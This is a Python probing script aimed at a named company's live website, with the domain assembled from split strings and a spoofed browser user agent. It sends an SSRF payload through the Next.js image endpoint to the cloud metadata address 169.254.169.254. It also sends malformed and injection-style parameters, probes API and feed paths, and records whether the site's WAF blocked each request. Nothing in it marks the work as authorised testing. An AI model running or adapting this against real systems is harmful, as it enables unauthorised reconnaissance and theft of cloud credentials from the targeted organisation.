import requests, urllib.parse, sys, json
B = "https://" + "www.infinity" + "capital" + ".bh"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
CDN = "https://" + "images." + "ctfassets" + ".net"
IMG = CDN + "/yts1dx0j7jj5/yRvqRHKqEsbLvrma0OXqV/4b64635f8f18ab2e546275054c0f0230/infinity.jpg"
EIMG = urllib.parse.quote(IMG, safe="")

def s():
    x = requests.Session()
    x.headers.update({"User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"})
    return x

TARGETS = {
 "img_valid": "/_next/image?url=" + EIMG + "&w=1080&q=75",
 "img_q":    "/_next/image?url=" + EIMG + "&w=1080&q=INJ77",
 "img_w":    "/_next/image?url=" + EIMG + "&w=abc&q=75",
 "img_url":  "/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=1080&q=75",
 "contact":   "/contact?x=1",
 "contact2":  "/contact?cb=1&q=test",
 "404":      "/404?q=test",
 "root":     "/?id=1&search=test&page=2",
 "api_id":   "/api/?id=1&page=2",
 "atom":     "/atom.xml",
 "feeds":    "/feeds/all.atom.xml",
 "send_get": "/api/send?none=1",
}

if __name__ == "__main__":
    sess = s()
    keys = sys.argv[1:] or list(TARGETS)
    for k in keys:
        p = TARGETS.get(k, k)
        try:
            r = sess.get(B + p, timeout=25, allow_redirects=False)
            print(f"{k:10} {r.status_code} len={len(r.content)} mit={r.headers.get('x-vercel-mitigated')} ct={r.headers.get('content-type')}")
            print("    body:", r.text[:160].replace("\n", " "))
        except Exception as e:
            print(f"{k:10} EXC {e}")
